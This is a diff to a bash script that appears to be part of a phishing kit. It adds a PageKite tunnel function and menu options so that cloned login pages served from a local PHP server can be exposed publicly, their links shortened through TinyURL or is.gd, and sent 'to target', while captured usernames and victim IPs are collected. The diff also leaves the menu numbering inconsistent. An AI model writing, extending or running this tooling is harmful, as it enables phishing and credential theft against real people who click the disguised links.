@@ -380,28 +380,6 @@ getcredentials
 
 
 ##
-# serverx() {
-# printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-# cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
-# sleep 2
-# printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-# command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-# if [[ -e sendlink ]]; then
-# rm -rf sendlink
-# fi
-# $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
-# printf "\n"
-# sleep 10 # &
-# send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-# printf "\n"
-# printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-# send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${send_link}" | head -n1)
-# printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-# printf "\n"
-# checkfound
-# }
-
-##
 # Serveo tunnel
 serverx() {
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
@@ -438,6 +416,8 @@ serverx() {
     fi
 
     printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Shortened link:\e[0m\e[1;77m %s \n' $send_ip
+    printf "\n"
+    checkfound
 }
 
 
@@ -597,6 +577,67 @@ start() {
 
     checkfound
 }
+    
+##
+# Pagekite tunnel
+pkstart() {
+    # Check if PageKite is installed
+    if ! command -v pagekite >/dev/null 2>&1; then
+        echo "Error: Pagekite is not installed."
+        echo "Please install Pagekite from https://pagekite.net/ or via your package manager."
+        echo "Try: sudo apt install pagekite."
+        exit 1
+    fi
+
+    # Clean previous IP and credentials files
+    if [[ -e sites/$server/ip.txt ]]; then rm -rf sites/$server/ip.txt; fi
+    if [[ -e sites/$server/usernames.txt ]]; then rm -rf sites/$server/usernames.txt; fi
+
+    # Prompt for a PageKite subdomain (without .pagekite.me)
+    read -p $'\e[1;92m[*] Enter your PageKite subdomain (Default: pagekite): \e[0m' pk_sub
+    pk_sub="${pk_sub:-pagekite}"
+
+    default_port="3333"
+    printf '\e[1;92m[*] Choose a Port (Default: %s): \e[0m' "$default_port"
+    read port
+    port="${port:-${default_port}}"
+
+    # Start the PHP server in the target site folder
+    printf "\e[1;92m[*] Starting php server on port %s...\n" "$port"
+    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    sleep 2
+
+    # Start the PageKite tunnel; ensure that PageKite is installed and in PATH.
+    printf "\e[1;92m[*] Starting PageKite tunnel...\n"
+    if [[ -e pagekite.log ]]; then rm -rf pagekite.log; fi
+    pagekite 80 ${pk_sub}.pagekite.me > pagekite.log 2>&1 &
+    sleep 15
+
+    # Extract the public URL from pagekite.log using an updated regex
+    pk_link=$(grep -Eo 'https?://[^ "'\''\n]*pagekite\.me' pagekite.log | head -n1)
+    if [ -z "$pk_link" ]; then
+        echo "Error: PageKite tunnel not generated. Here is the log output:"
+        cat pagekite.log
+        exit 1
+    fi
+
+    printf "\n\e[1;93m[*] Send the direct link to target: %s \n" "$pk_link"
+
+    # Shorten the URL using TinyURL (fallback to is.gd)
+    send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=${pk_link}" | head -n1)
+    if [ -z "$send_ip" ] || [[ "$send_ip" == *"Error"* ]]; then
+        echo "TinyURL failed, switching to is.gd..."
+        send_ip=$(curl -s "https://is.gd/create.php?format=simple&url=${pk_link}" | head -n1)
+        if [ -z "$send_ip" ]; then
+            echo "Error: Failed to shorten URL using both TinyURL and is.gd."
+            exit 1
+        fi
+    fi
+
+    printf '\n\e[1;93m[*] Shortened link: %s \n' "$send_ip"
+    printf "\n"
+    checkfound
+}
 
 
 start1() {
@@ -609,8 +650,9 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m PageKite\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m sish\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Packetriot\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run (SSH Tunelling)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run\e[0m\n"
 
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
@@ -620,6 +662,24 @@ startx
 
 elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start
+
+elif [[ $option_server == 3 || $option_server == 03 ]]; then
+pkstart
+
+elif [[ $option_server == 4 || $option_server == 04 ]]; then
+sishstart
+
+elif [[ $option_server == 5 || $option_server == 05 ]]; then
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Packetriot is not supported yet.\e[0m\n"
+    sleep 1
+    clear
+    start1
+
+elif [[ $option_server == 6 || $option_server == 06 ]]; then
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] localhost.run is not supported yet.\e[0m\n"
+    sleep 1
+    clear
+    start1
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
